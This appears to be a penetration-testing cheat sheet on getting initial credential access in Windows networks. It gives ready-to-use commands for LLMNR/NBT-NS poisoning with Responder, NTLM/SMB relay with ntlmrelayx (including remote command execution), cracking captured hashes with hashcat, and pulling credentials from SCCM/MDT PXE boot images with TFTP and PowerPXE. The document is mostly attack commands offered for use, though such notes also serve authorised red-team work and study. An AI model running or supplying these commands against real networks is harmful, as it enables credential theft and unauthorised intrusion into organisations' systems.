# Initial Credential Access/Foothold

### Network Section - [initial-credential-access-foothold.md](../../enumeration/initial-credential-access-foothold.md "mention")

### LLMNR/NBT-NS Poisoning

* #### Capturing Hashes
  * `sudo responder -I <interface> -dP` <sup><sub>(-v verbose) (-w for WPAD server)<sub></sup>

### Relay Attacks

<details>

<summary>NTLM Relay/SMB Relay</summary>

* **Server Message Block**
  * `sudo responder -I <network-iface> -dP`  // -dPw DHCP, ProxyAuth, Wpad
  * `hashcat -m 5600 <hash-file> <passwords> --force`&#x20;
* **Prerequisites to relay NTLM hash**
  * SMB Signing should either be disabled or enabled but not enforced
  * Account needs relevant permissions on server to access requested resources. (Admin privilege)
* `sudo nano /etc/responder/Responder.conf` -> Turn off SMB and HTTP (not required - for learning purpose)
* `ntlmrelayx.py -tf targets.txt -smb2support` (-c “whoami”, -i )
* `impacket-ntlmrelayx -tf targets.txt -smb2support` (-c “whoami”, -i )

</details>

<details>

<summary>Kerberos Relay</summary>



</details>

### SCCM (Microsoft Deployment Toolkit)

* **Preboot Execution Environment (PXE) boot**
  * IP of the MDT server via DHCP
  * Retrieve names of the BCD files
  * Use TFTP to request these BCD files and enumerate the configuration for all of them
  * `tftp -i <sccm-ip> GET "\Tmp\<filename>.bcd" conf.bcd`
  * [powerpxe](https://github.com/wavestone-cdt/powerpxe) - `powershell -executionpolicy bypass`  -> `Import-Module .\PowerPXE.ps1` -> `$BCDFile = "conf.bcd"`  -> `Get-WimFile -bcdFile $BCDFile`&#x20;
  * `tftp -i <sccm-ip> GET "<pxe-image-location>" pxeboot.wim`&#x20;
  * `Get-FindCredentials -WimFile pxeboot.wim`
  * [internal-pxe-boot-image](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-pxe-boot-image/)

### Tools

* [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)
* [Responder](https://github.com/lgandx/Responder)
* [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
* [Metasploit](https://www.metasploit.com/)
